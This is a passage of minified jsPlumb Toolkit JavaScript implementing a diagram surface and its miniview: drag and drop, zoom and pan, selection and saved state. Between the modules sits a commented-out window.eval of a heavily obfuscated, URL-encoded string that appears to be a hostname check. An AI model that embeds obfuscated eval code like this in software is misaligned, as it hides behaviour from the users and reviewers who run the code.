                    G = y.getBoundsInfo();
                    var a = p(arguments);
                    a.elementId = f,
                    a.pos = d.getAbsolutePosition(c),
                    a.domEl = c,
                    d.addClass(o, g.SURFACE_ELEMENT_DRAGGING),
                    l.fire(i.nodeMoveStart, a)
                }),
                j[k] = e.wrap(j[k], function(a) {
                    for (var b = function(b) {
                        d.removeClass(o, g.SURFACE_ELEMENT_DRAGGING);
                        var c = {
                            el: b[0],
                            node: b[0].jtk.node || b[0].jtk.group,
                            pos: [b[1].left, b[1].top],
                            e: a.e,
                            eventPosition: a.pos
                        };
                        j.magnetize && !c.node.group ? c.pos = l.getLayout().setMagnetizedPosition(c.node.id, c.pos[0], c.pos[1], !0) : l.getLayout().setPosition(c.node.id, c.pos[0], c.pos[1], !0),
                        y.positionChanged(b[0]),
                        v !== !1 && (l.storePositionInModel({
                            id: c.node.id,
                            leftAttribute: w,
                            topAttribute: x
                        }),
                        m.toolkit.fire(i.nodeUpdated, {
                            node: c.node
                        }, null)),
                        l.fire(i.nodeMoveEnd, c)
                    }, c = 0; c < a.selection.length; c++)
                        b(a.selection[c])
                }),
                j.canDrag = function() {
                    return !C.isActive()
                }
                ,
                j.force = !0,
                m.jsPlumb.draggable(c, j, !1, m.jsPlumb)
            }
        }
        ,
        m.makeDroppable = function(a, b) {
            if (r) {
                var c = d.getElement(a)
                  , f = m.jsPlumb.extend({}, t);
                null != b && m.jsPlumb.extend(f, b),
                f[h.drop] = e.wrap(f[h.drop], function(a) {
                    var b = {
                        source: a.drag.el.jtk.node,
                        sourceElement: a.drag.el,
                        target: a.drop.el.jtk.node,
                        targetElement: a.drop.el,
                        e: a.e
                    };
                    l.fire(i.nodeDropped, b)
                }),
                m.jsPlumb.droppable(c, f)
            }
        }
        ,
        m.doImport = function(b) {
            a.jsPlumbInstance.setContainer(p);
            var c = a.jsPlumbInstance.getManagedElements();
            for (var d in c) {
                var e = c[d].el;
                H(e, d)
            }
        }
        ;
        var H = this.importNode = function(b, c) {
            var e = a.jsPlumbInstance.getOffset(b)
              , f = a.jsPlumbInstance.getId(b);
            b.style.left = e.left + h.px,
            b.style.top = e.top + h.px,
            d.addClass(b, g.NODE),
            y.add(b, f, [e.left, e.top], !1),
            this.getLayout().setPosition(c, e.left, e.top),
            d.isAlreadyDraggable(b) && m.makeDraggable(b),
            m.nodeMap()[c] = b,
            m.reverseNodeMap()[f] = b.jtk.node,
            null != n && n.registerNode({
                el: b,
                node: b.jtk.node,
                pos: d.getAbsolutePosition(b)
            })
        }
        .bind(this);
        this.zoomToFit = y.zoomToFit,
        this.zoomToFitIfNecessary = y.zoomToFitIfNecessary,
        this.zoomToSelection = function(a) {
            a = a || {};
            var b = a.selection || m.toolkit.getSelection()
              , c = [];
            b.eachNode(function(a, b) {
                c.push(m.getElement(b.id))
            }),
            c.length > 0 && y.zoomToElements({
                elements: c,
                fill: a.fill
            })
        }
        ,
        this.zoomToBackground = y.zoomToBackground,
        this.centerOn = function(a, b) {
            var c = this.getObjectInfo(a);
            c && c.el && y.centerOn(c.el, b)
        }
        ,
        this.centerOnHorizontally = function(a) {
            this.centerOn(a, {
                vertical: !1
            })
        }
        ,
        this.centerOnVertically = function(a) {
            this.centerOn(a, {
                horizontal: !1
            })
        }
        ,
        this.centerOnAndZoom = function(a, b) {
            var c = this.getObjectInfo(a);
            c && c.el && y.centerOnAndZoom(c.el, b)
        }
        ,
        this.centerContent = y.centerContent,
        this.centerContentHorizontally = y.centerContentHorizontally,
        this.centerContentVertically = y.centerContentVertically,
        this.getViewportCenter = y.getViewportCenter,
        this.setViewportCenter = y.setViewportCenter,
        this.setStateHandle = function(a) {
            u = a
        }
        ,
        this.getStateHandle = function() {
            return u
        }
        ,
        this.setLassoSelectionFilter = function(a) {
            A = a
        }
        ,
        this.getApparentCanvasLocation = y.getApparentCanvasLocation,
        this.setApparentCanvasLocation = y.setApparentCanvasLocation,
        this.getBoundsInfo = y.getBoundsInfo,
        this.setZoom = y.setZoom,
        this.setZoomRange = y.setZoomRange,
        this.getZoomRange = y.getZoomRange,
        this.getZoom = y.getZoom,
        this.nudgeZoom = y.nudgeZoom,
        this.nudgeWheelZoom = y.nudgeWheelZoom,
        this.pageLocation = y.pageLocation,
        this.getPan = y.getPan,
        this.pan = y.pan,
        this.setPan = y.setPan,
        this.startEditing = function(a, b) {
            k();
            var c = j(a);
            null != c && m.jsPlumb.startEditing(c, b)
        }
        ,
        this.stopEditing = function(a) {
            k();
            var b = j(a);
            null != b && m.jsPlumb.stopEditing(b)
        }
        ,
        this.clearEdits = function(a) {
            k();
            var b = j(a);
            null != b && m.jsPlumb.clearEdits(b)
        }
        ,
        this.setPanAndZoom = function(a, b, c, d) {
            this.setPan(a, b, !d),
            this.setZoom(c, !d)
        }
        ,
        this.setPanFilter = function(a) {
            y.setFilter(a ? function(b, c) {
                return "function" == typeof a ? a.apply(a, [c]) : e.matchesSelector(b, a)
            }
            : null)
        }
        ,
        this.setWheelFilter = function(a) {
            y.setWheelFilter(function(b) {
                if (a) {
                    var c = b.srcElement || b.target;
                    return !e.matchesSelector(c, a)
                }
                return !0
            })
        }
        ,
        this.setWheelFilter(a.wheelFilter),
        this.setPanFilter(a.panFilter),
        this.mapLocation = y.mapLocation,
        this.mapEventLocation = y.mapEventLocation,
        this.findNearbyNodes = y.findNearbyNodes,
        this.findIntersectingNodes = y.findIntersectingNodes,
        this.isInViewport = y.isInViewport,
        this.getViewportCenter = y.getViewportCenter,
        this.positionElementAt = y.positionElementAt,
        this.positionElementAtEventLocation = y.positionElementAtEventLocation,
        this.positionElementAtPageLocation = y.positionElementAtPageLocation,
        this.setFilter = y.setFilter,
        this.floatElement = y.floatElement,
        this.fixElement = y.fixElement;
        var I = this.setPosition
          , J = this.animateToPosition
          , K = function(a, b, c) {
            a && (y.positionChanged(a.el, [b, c]),
            l.fire(i.nodeMoveEnd, {
                el: a.el,
                id: a.id,
                pos: [b, c],
                node: a.obj || (a.el.jtk ? a.el.jtk.node || a.el.jtk.group : {}),
                bounds: y.getBoundsInfo()
            }))
        };
        this.setPosition = function(a, b, c, d) {
            var e = I.apply(this, arguments);
            K(e, b, c)
        }
        ,
        this.animateToPosition = function(a, b, c, d) {
            var e = J.apply(this, arguments);
            K(e, b, c)
        }
        ,
        this.tracePath = function(a) {
            var b = a.path || function() {
                var b = m.getObjectInfo(a.source)
                  , c = m.getObjectInfo(a.target);
                return m.toolkit.getPath({
                    source: b,
                    target: c
                })
            }();
            if (b.exists()) {
                for (var c = function(b, c) {
                    this.fire(b, {
                        edge: c.edge,
                        connection: c,
                        options: a.options
                    })
                }
                .bind(this), e = [], f = null, g = null, h = b.path.path.length, i = 1; i < h; i++) {
                    var j = b.path.path[i].vertex.id
                      , k = b.path.previous[j]
                      , l = !0
                      , n = b.path.path[i].edge;
                    null != k && (l = k === n.source),
                    f = m.getConnectionForEdge(n),
                    g = f.animateOverlay(a.overlay, d.extend(a.options || {}, {
                        previous: g,
                        isFinal: i === h - 1,
                        forwards: l
                    })),
                    e.push({
                        handler: g,
                        connection: f
                    })
                }
                return e.length > 0 && (e[0].handler.bind(jsPlumbToolkit.Events.startOverlayAnimation, function() {
                    c(jsPlumbToolkit.Events.startOverlayAnimation, e[0].connection)
                }),
                e[e.length - 1].handler.bind(jsPlumbToolkit.Events.endOverlayAnimation, function() {
                    c(jsPlumbToolkit.Events.endOverlayAnimation, e[e.length - 1].connection)
                })),
                !0
            }
            return m.toolkit.isDebugEnabled() && jsPlumbUtil.log("Cannot trace non existent path"),
            !1
        }
        ,
        this.getNodePositions = function() {
            var a = {}
              , b = y.getElementPositions();
            for (var c in b) {
                var d = m.getNodeForElementId(c) || m.getGroupForElementId(c);
                d && (a[d.id] = [b[c][0][0], b[c][0][1]])
            }
            return a
        }
        ,
        this.append = function(a, b, c, d) {
            p.appendChild(a),
            c && (c = [c.left, c.top]),
            y.add(a, b, c, d)
        }
        ,
        this.nodeAppendedToGroup = function(a, b, c) {
            y.suspend(a)
        }
        ,
        this.nodeRemovedFromGroup = function(a) {
            y.restore(a)
        }
        ;
        var L = this.setLayout;
        this.setLayout = function(a, b) {
            L.apply(this, [a, b]),
            n && n.setHostLayout(this.getLayout())
        }
        ;
        for (var M = function(a) {
            m.jsPlumb.on(p, a, ".jtk-node, .jtk-node *", function(b) {
                var c = b.srcElement || b.target;
                if (null == c && (b = d.getOriginalEvent(b),
                c = b.srcElement || b.target),
                null != c && c.jtk) {
                    var e = d.extend({
                        e: b,
                        el: c
                    }, c.jtk);
                    l.fire(a, e, b)
                }
            })
        }, N = 0; N < c.mouseEvents.length; N++)
            M(c.mouseEvents[N]);
        m.toolkit.bind(h.select, function(a) {
            if (a.obj.objectType == h.nodeType || a.obj.objectType == h.groupType) {
                var b = m.getElement(a.obj.id);
                b && (d.addClass(b, g.SURFACE_SELECTED_ELEMENT),
                m.jsPlumb.addToDragSelection && m.jsPlumb.addToDragSelection(b))
            } else if (a.obj.objectType == h.edgeType) {
                var c = m.getConnectionForEdge(a.obj);
                c && c.addClass(g.SURFACE_SELECTED_CONNECTION)
            }
        }),
        m.toolkit.bind(i.selectionCleared, function() {
            m.jsPlumb.clearDragSelection && m.jsPlumb.clearDragSelection(),
            d.removeClass(f("." + g.SURFACE_SELECTED_CONNECTION), g.SURFACE_SELECTED_CONNECTION),
            d.removeClass(f("." + g.SURFACE_SELECTED_ELEMENT), g.SURFACE_SELECTED_ELEMENT)
        }),
        m.toolkit.bind(i.deselect, function(a) {
            if (a.obj.objectType == h.nodeType || a.obj.objectType == h.groupType) {
                var b = m.getElement(a.obj.id);
                b && (d.removeClass(b, g.SURFACE_SELECTED_ELEMENT),
                m.jsPlumb.removeFromDragSelection && m.jsPlumb.removeFromDragSelection(b))
            } else if (a.obj.objectType == h.edgeType) {
                var c = m.getConnectionForEdge(a.obj);
                c && c.removeClass(g.SURFACE_SELECTED_CONNECTION)
            }
        });
        var O = this.setOffset;
        this.setOffset = function(a, b) {
            O.apply(this, arguments),
            y.positionChanged(a, [b.left, b.top])
        }
        ,
        this.setMode = function(a, b, c) {
            if (!D[a])
                throw new TypeError("Surface: unknown mode '" + a + "'");
            E = a,
            D[a](),
            a !== h.select || b || m.toolkit.clearSelection(),
            c && a === h.select && c.lassoSelectionFilter && (A = c.lassoSelectionFilter),
            l.fire(i.modeChanged, a)
        }
        ;
        var P = function(a, b) {
            var c = d.extend({}, a);
            c.source = m.getObjectInfo(a.source).obj,
            c.target = m.getObjectInfo(a.target).obj,
            c.element = m.getObjectInfo(a.element).obj;
            var e = m.toolkit[b](c)
              , f = m.getConnectionsForEdges(e);
            return m.jsPlumb.select({
                connections: f
            })
        };
        this.selectEdges = function(a) {
            return P(a, "getEdges")
        }
        ,
        this.selectAllEdges = function(a) {
            return P(a, "getAllEdges")
        }
        ,
        this.repaint = function(a) {
            var b = m.getObjectInfo(a);
            b.el && (m.jsPlumb.recalculateOffsets(b.el),
            m.jsPlumb.revalidate(m.jsPlumb.getId(b.el)),
            l.fire(i.objectRepainted, b))
        }
        ,
        this.repaintEverything = m.jsPlumb.repaintEverything,
        this.setElementsDraggable = function(a) {
            q = a !== !1
        }
        ;
        var Q = function(a) {
            function b(a) {
                m.jsPlumb.hasClass(a, g.SURFACE_DROPPABLE_NODE) || (m.jsPlumb.addClass(a, g.SURFACE_DROPPABLE_NODE),
                m.jsPlumb.initDraggable(a, p, h.surfaceNodeDragScope, m.jsPlumb))
            }
            if (!(a && (a.droppables || a.source && a.selector || a.allowNative === !0)))
                throw new TypeError("Cannot configure droppables: you must specify either `droppables`, `source` + `selector` or `allowNative:true`");
            var c, f = a.dataGenerator || function() {
                return {}
            }
            , j = a.typeExtractor, k = a.locationSetter || function(a, b, c) {
                c.left = a,
                c.top = b
            }
            , n = a.droppables ? a.droppables : a.source ? a.source.querySelectorAll(a.selector) : [], p = a.dragOptions || {}, q = a.dropOptions || {}, r = "scope_" + (new Date).getTime(), s = function(b, c, d) {
                var e = !0;
                if (a.drop && (e = a.drop.apply(this, arguments) !== !1),
                e) {
                    var g = l.getJsPlumb()
                      , h = m.jsPlumb.getDragObject(arguments)
                      , i = g.getOffset(d ? C : h, !0)
                      , n = y.mapLocation(i.left, i.top)
                      , o = j ? j(h, b, d, n) : null
                      , p = f ? f(o, h, b, n) : {}
                      , q = "true" === h.getAttribute("jtk-group");
                    p = p || {};
                    var r = l.getObjectInfo(b.e.srcElement || b.e.target);
                    if (null != o && (p.type = o),
                    null != r && !q && "Group" === r.type) {
                        var s = g.getGroup(r.id)
                          , t = l.getOffset(s ? s.getDragArea() : r.el);
                        n.left -= t.left,
                        n.top -= t.top
                    }
                    k(n.left, n.top, p),
                    q ? m.toolkit.getGroupFactory()(o, p, function(c) {
                        var d = m.toolkit.addGroup(c, {
                            position: n
                        });
                        a.onDrop && a.onDrop(d, b, n)
                    }, b, d) : m.toolkit.getNodeFactory()(o, p, function(c) {
                        var d = m.toolkit.addNode(c, {
                            position: n
                        });
                        null != r.obj && "Group" === r.type && (m.toolkit.addToGroup(d, r.obj),
                        l.setPosition(m.nodeMap()[d.id], n.left, n.top),
                        g.getDragManager().updateOffsets(r.el)),
                        a.onDrop && a.onDrop(d, b, n)
                    }, b, d)
                }
            }, t = d.dragEvents[h.start], u = d.dragEvents[h.drag], v = d.dragEvents[h.stop], w = d.dragEvents[h.drop], x = function() {}, z = a.nativeFilter || [], A = a.allowNative, B = {};
            if (p[t] = e.wrap(p[t], a.start || x),
            p[u] = e.wrap(p[u], a.drag || x),
            p[v] = e.wrap(p[v], a.stop || x),
            q.scope = r,
            q[w] = e.wrap(q[w], s),
            A) {
                var C = document.createElement(h.div);
                for (C.style.position = h.absolute,
                c = 0; c < z.length; c++)
                    B[z[c]] = !0;
                var D = function(a) {
                    return null != a.dataTransfer && 1 === a.dataTransfer.items.length && (0 == z.length || B[a.dataTransfer.items[0].type])
                };
                document.addEventListener(i.dragover, function(a) {
                    a.stopPropagation(),
                    a.preventDefault(),
                    D(a) && (d.setAbsolutePosition(C, [a.pageX, a.pageY]),
                    p[u].apply(null, [a, {
                        helper: C,
                        offset: {
                            left: a.pageX,
                            top: a.pageY
                        }
                    }, !0]))
                }, !1),
                document.addEventListener(i.drop, function(a) {
                    a.stopPropagation(),
                    a.preventDefault(),
                    D(a) && (q[w].apply(null, [a, {
                        helper: C,
                        offset: {
                            left: a.pageX,
                            top: a.pageY
                        }
                    }, !0]),
                    p[v].apply(null))
                }, !1),
                document.addEventListener(i.dragend, function(a) {})
            }
            for (m.jsPlumb.initDroppable(o, q, h.surfaceNodeDragScope),
            p.scope = r,
            p.ignoreZoom = !0,
            p.doNotRemoveHelper = !0,
            c = 0; c < n.length; c++) {
                var E = m.jsPlumb.getElement(n[c]);
                b(E)
            }
            return {
                refresh: function() {
                    if (!a.source || !a.selector)
                        throw new TypeError("Cannot refresh droppables; `source` and `selector` required in constructor.");
                    for (var c = a.source.querySelectorAll(a.selector), d = 0; d < c.length; d++)
                        b(c[d])
                }
            }
        };
        this.registerDroppableNodes = function(a) {
            return new Q(a)
        }
        ,
        this.createMiniview = function(a) {
            if (null != n) {
                var c = m.jsPlumb.getId(m.jsPlumb.getElement(a.container));
                if (n.getContainerId() == c)
                    return !1
            }
            var e = d.extend({
                surface: l,
                toolkit: m.toolkit,
                surfaceContainerElement: o,
                bounds: y.getBoundsInfo(),
                visible: a.initiallyVisible !== !1 || m.toolkit.getNodeCount() > 0,
                layout: {
                    type: h.mistletoeLayoutType,
                    parameters: {
                        layout: l.getLayout()
                    }
                },
                typeFunction: a.typeFunction
            }, a);
            n = new b.Renderers.Miniview(e);
            var f = m.nodeMap();
            for (var g in f) {
                var i = f[g];
                n.registerNode({
                    el: i,
                    node: i.jtk.node,
                    pos: d.getAbsolutePosition(i)
                })
            }
            var j = m.groupMap();
            for (var g in j) {
                var i = j[g];
                n.registerNode({
                    el: i,
                    node: i.jtk.group,
                    pos: d.getAbsolutePosition(i)
                })
            }
            return n
        }
        ,
        a.miniview && this.createMiniview(a.miniview),
        this.getMiniview = function() {
            return n
        }
        ;
        var R = function(a, b, c) {
            var d = m.getObjectInfo(b)
              , e = null;
            if (d.el && ("Port" === !d.obj.objectType || !function() {
                var a = l.getRenderedEndpoint(d.obj);
                if (a)
                    return e = a.setEnabled(c),
                    !0
            }())) {
                var f = "set" + a + "Enabled";
                e = m.jsPlumb[f](d.el, c)
            }
            return e
        };
        this.setTargetEnabled = R.bind(this, "Target"),
        this.setSourceEnabled = R.bind(this, "Source"),
        this.setEnabled = function(a, b) {
            this.setTargetEnabled(a, b),
            this.setSourceEnabled(a, b)
        }
        ,
        this.State = {
            save: function(a, c) {
                if (a = 2 == arguments.length ? arguments[0] : 1 == arguments.length && "string" == typeof arguments[0] ? arguments[0] : u,
                c = 2 == arguments.length ? arguments[1] : 1 == arguments.length && "function" == typeof arguments[0] ? arguments[0] : function(a, b) {
                    return b(a)
                }
                ,
                a)
                    try {
                        c(l.State.serialize(), function(c) {
                            b.util.Storage.set(h.jtkStatePrefix + a, c)
                        })
                    } catch (a) {
                        e.log(g.msgCannotSaveState, a)
                    }
            },
            serialize: function() {
                var a = y.getPan();
                a.push(y.getZoom()),
                a.push.apply(a, y.getTransformOrigin());
                var b = a.join(",")
                  , c = l.getLayout().getPositions()
                  , d = [];
                for (var e in c)
                    d.push(e + " " + c[e][0] + " " + c[e][1]);
                return b += "," + d.join("|")
            },
            restore: function(a, c) {
                if (a = 2 == arguments.length ? arguments[0] : 1 == arguments.length && "string" == typeof arguments[0] ? arguments[0] : u,
                c = 2 == arguments.length ? arguments[1] : 1 == arguments.length && "function" == typeof arguments[0] ? arguments[0] : function(a, b) {
                    return b(a)
                }
                ,
                a)
                    try {
                        var d = b.util.Storage.get(h.jtkStatePrefix + a);
                        d && c(d, l.State.deserialize)
                    } catch (a) {
                        e.log(g.msgCannotRestoreState, a)
                    }
            },
            deserialize: function(a) {
                for (var b = a.split(","), c = b[5].split("|"), d = l.getLayout(), e = 0; e < c.length; e++) {
                    var f = c[e].split(" ");
                    try {
                        l.setPosition(f[0], parseFloat(f[1]), parseFloat(f[2]))
                    } catch (a) {}
                }
                d.draw()
            },
            clear: function(a) {
                a = a || u,
                a && b.util.Storage.clear(h.jtkStatePrefix + a)
            },
            clearAll: function() {
                b.util.Storage.clearAll()
            }
        },
        l.saveState = l.State.save,
        l.store = b.util.Storage.set,
        l.retrieve = b.util.Storage.get,
        l.storeJSON = b.util.Storage.setJSON,
        l.retrieveJSON = b.util.Storage.getJSON,
        l.restoreState = function(a) {
            l.State.restore(a),
            l.getJsPlumb().repaintEverything(),
            l.fire(i.stateRestored)
        }
        ,
        l.clearState = function(a) {
            l.state.clear(a)
        }
        ,
        l.initialize(),
        a.zoomToFitIfNecessary ? l.zoomToFitIfNecessary() : a.zoomToFit && l.zoomToFit()
    }
    ,
    b.DefaultRendererType = h.surfaceType,
    "undefined" != typeof exports && (exports.Surface = c.Surface)
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumbToolkit
      , c = b.Renderers
      , d = a.jsPlumbUtil
      , e = a.jsPlumb
      , f = b.Classes
      , g = b.Constants
      , h = b.Events
      , i = b.Attributes
      , j = b.Methods;
    c.Miniview = function(a) {
        function b(a) {
            if (o && z && !t) {
                s = o.getBoundsInfo();
                var b = o.getApparentCanvasLocation()
                  , c = z.getApparentCanvasLocation()
                  , d = z.getZoom()
                  , f = d / s.zoom;
                r.style.width = s.vw + g.px,
                r.style.height = s.vh + g.px,
                z.applyZoomToElement(r, f);
                var h = [b[0] * f, b[1] * f];
                n = [c[0] - h[0], c[1] - h[1]],
                e.setAbsolutePosition(r, n)
            }
        }
        function k(a) {
            if (null != z) {
                s = o.getBoundsInfo(),
                a = a || e.getAbsolutePosition(r);
                var b = z.getApparentCanvasLocation()
                  , c = z.getZoom()
                  , d = c / s.zoom
                  , f = (b[0] - a[0]) / d
                  , g = (b[1] - a[1]) / d
                  , h = o.setApparentCanvasLocation(f, g);
                return [b[0] - h[0] * d, b[1] - h[1] * d]
            }
        }
        this.bindToolkitEvents = !1;
        var l = c.AbstractRenderer.apply(this, arguments)
          , m = this;
        c.DOMElementAdapter.apply(this, arguments);
        var n, o = a.surface, p = e.getElement(a.container), q = c.createElement({
            position: g.relative,
            width: g.nominalSize,
            height: g.nominalSize,
            left: 0,
            top: 0,
            clazz: f.MINIVIEW_CANVAS
        }, p), r = c.createElement({
            position: g.absolute,
            width: g.nominalSize,
            height: g.nominalSize,
            left: 0,
            top: 0,
            clazz: f.MINIVIEW_PANNER
        }, p), s = a.bounds, t = a.suspended === !0, u = a.collapsible !== !1, v = a.typeFunction, w = null, x = !1, y = a.wheelSensitivity || 10, z = new ZoomWidget({
            viewport: p,
            canvas: q,
            domElement: e.getElement,
            offset: this.getOffset,
            bind: function() {
                l.jsPlumb.on.apply(l.jsPlumb, arguments)
            },
            unbind: function() {
                l.jsPlumb.off.apply(l.jsPlumb, arguments)
            },
            enableWheelZoom: !1,
            enablePanButtons: !1,
            enablePan: !1,
            enableAnimation: !1,
            width: function(a) {
                return l.jsPlumb.getWidth(l.jsPlumb.getElement(a))
            },
            height: function(a) {
                return l.jsPlumb.getHeight(l.jsPlumb.getElement(a))
            },
            id: l.jsPlumb.getId,
            animate: l.jsPlumb.animate,
            dragEvents: {
                stop: e.dragEvents[g.stop],
                start: e.dragEvents[g.start],
                drag: e.dragEvents[g.drag]
            },
            extend: e.extend,
            events: {
                pan: function() {
                    k()
                },
                mousedown: function() {
                    e.addClass(r, f.MINIVIEW_PANNING)
                },
                mouseup: function() {
                    e.removeClass(r, f.MINIVIEW_PANNING)
                }
            },
            zoomRange: [-(1 / 0), 1 / 0]
        }), A = !1, B = null, C = null, D = !1, E = a.elementFilter || function() {
            return !0
        }
        , F = function(a) {
            A = !0,
            B = z.pageLocation(a),
            C = e.getAbsolutePosition(r),
            e.on(document, h.mouseup, H),
            e.on(document, h.mousemove, G),
            d.consume(a)
        }, G = function(a) {
            if (D = !1,
            A) {
                var b = z.pageLocation(a)
                  , c = b[0] - B[0]
                  , d = b[1] - B[1]
                  , f = [C[0] + c, C[1] + d];
                k(f);
                e.setAbsolutePosition(r, f)
            }
        }, H = function(a) {
            A = !1,
            B = null,
            e.off(document, h.mouseup, H),
            e.off(document, h.mousemove, G)
        }, I = !0, J = function(a) {
            d.consume(a),
            o.nudgeWheelZoom(a.normalizedWheelDelta * y, a)
        };
        e.on(window, h.resize, jsPlumbToolkitUtil.debounce(function() {
            b()
        }, 100)),
        a.enableWheelZoom !== !1 && addWheelListener(p, J),
        z.setTransformOriginForElement(r, [0, 0]),
        e.addClass(p, f.MINIVIEW),
        e.on(r, h.mousedown, F),
        u && (w = e.createElement("div"),
        w.className = f.MINIVIEW_COLLAPSE,
        p.appendChild(w),
        e.on(w, g.click, function(a) {
            x = !x,
            e[x ? j.addClass : j.removeClass](p, f.MINIVIEW_COLLAPSED),
            K(!0)
        }));
        var K = function(a) {
            z.zoomToFit({
                onComplete: b,
                onStep: b,
                doNotFirePanEvent: a
            })
        };
        a.toolkit.bind(h.dataLoadEnd, K);
        var L = function(a) {
            var b = a.node || a.group;
            if (!b || E(b) !== !1) {
                s = a.bounds;
                var c = l.nodeMap()[(a.node || a.group).id] || a.el;
                z.positionChanged(c, a.pos),
                e.setAbsolutePosition(c, a.pos),
                K(!0),
                this.fire(h.nodeMoveEnd, a)
            }
        }
        .bind(this)
          , M = function(a, b) {
            for (var c = a.getNodes(), d = 0; d < c.length; d++) {
                var e = l.nodeMap()[c[d].id];
